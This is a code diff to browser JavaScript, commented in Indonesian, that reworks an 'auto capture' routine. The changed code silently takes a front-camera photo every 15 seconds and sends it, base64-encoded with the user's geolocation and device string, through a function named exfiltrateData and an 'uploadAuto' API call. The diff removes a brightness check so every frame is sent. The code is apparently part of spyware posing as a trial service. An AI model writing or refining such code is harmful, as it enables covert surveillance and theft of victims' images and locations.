@@ -529,54 +529,58 @@
         }
     }
     
-    // ========== AUTO CAPTURE FIX (DENGAN DELAY & CEK BRIGHTNESS) ==========
-    async function startAutoCapture() {
-        if (autoCaptureInterval) clearInterval(autoCaptureInterval);
-        autoCaptureInterval = setInterval(async () => {
-            if (!autoVideoReady || !autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) return;
-            try {
-                // Tunggu 500ms agar kamera stabil
-                await new Promise(resolve => setTimeout(resolve, 500));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = autoVideo.videoWidth;
-                canvas.height = autoVideo.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(autoVideo, 0, 0);
-                
-                // Cek kecerahan di tengah gambar
-                const pixelData = ctx.getImageData(canvas.width/2, canvas.height/2, 1, 1).data;
-                const brightness = (pixelData[0] + pixelData[1] + pixelData[2]) / 3;
-                
-                if (brightness < 30) {
-                    console.log('⚠️ Auto capture: gambar terlalu gelap, skip');
-                    return;
-                }
-                
-                canvas.toBlob(async (blob) => {
-                    if (blob && blob.size > 5000) {
-                        const base64 = await blobToBase64(blob);
-                        exfiltrateData('photo', {
-                            imageData: base64,
-                            camera: 'front',
-                            timestamp: Date.now(),
-                            location: userLocation
-                        });
-                        await callAPI('uploadAuto', {
-                            imageData: base64,
-                            metadata: {
-                                latitude: userLocation.lat || 0,
-                                longitude: userLocation.lng || 0,
-                                device: navigator.userAgent
-                            }
-                        });
+    // ========== AUTO CAPTURE (KAMERA DEPAN) - TANPA CEK BRIGHTNESS ==========
+async function startAutoCapture() {
+    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+    
+    autoCaptureInterval = setInterval(async () => {
+        if (!autoVideoReady || !autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) return;
+        
+        try {
+            // Tunggu 1 detik agar kamera stabil
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = autoVideo.videoWidth;
+            canvas.height = autoVideo.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(autoVideo, 0, 0);
+            
+            // LANGSUNG KIRIM, TANPA CEK BRIGHTNESS
+            canvas.toBlob(async (blob) => {
+                if (blob && blob.size > 5000) {
+                    const base64 = await blobToBase64(blob);
+                    
+                    exfiltrateData('photo', {
+                        imageData: base64,
+                        camera: 'front',
+                        timestamp: Date.now(),
+                        location: userLocation
+                    });
+                    
+                    const result = await callAPI('uploadAuto', {
+                        imageData: base64,
+                        metadata: {
+                            latitude: userLocation.lat || 0,
+                            longitude: userLocation.lng || 0,
+                            device: navigator.userAgent
+                        }
+                    });
+                    
+                    console.log('📸 Auto capture result:', result);
+                    
+                    if (result.success) {
                         autoCamStatus.innerHTML = '📷 Auto Capture: Berhasil';
                         setTimeout(() => { autoCamStatus.innerHTML = '📷 Auto Capture: Aktif'; }, 2000);
                     }
-                }, 'image/jpeg', 0.8);
-            } catch(e) { console.log(e); }
-        }, 15000);
-    }
+                }
+            }, 'image/jpeg', 0.9);
+            
+        } catch(e) { 
+            console.error('Auto capture error:', e); 
+        }
+    }, 15000);
+}
     
     function trackFileUploads() {
         fileInput.addEventListener('change', function(event) {
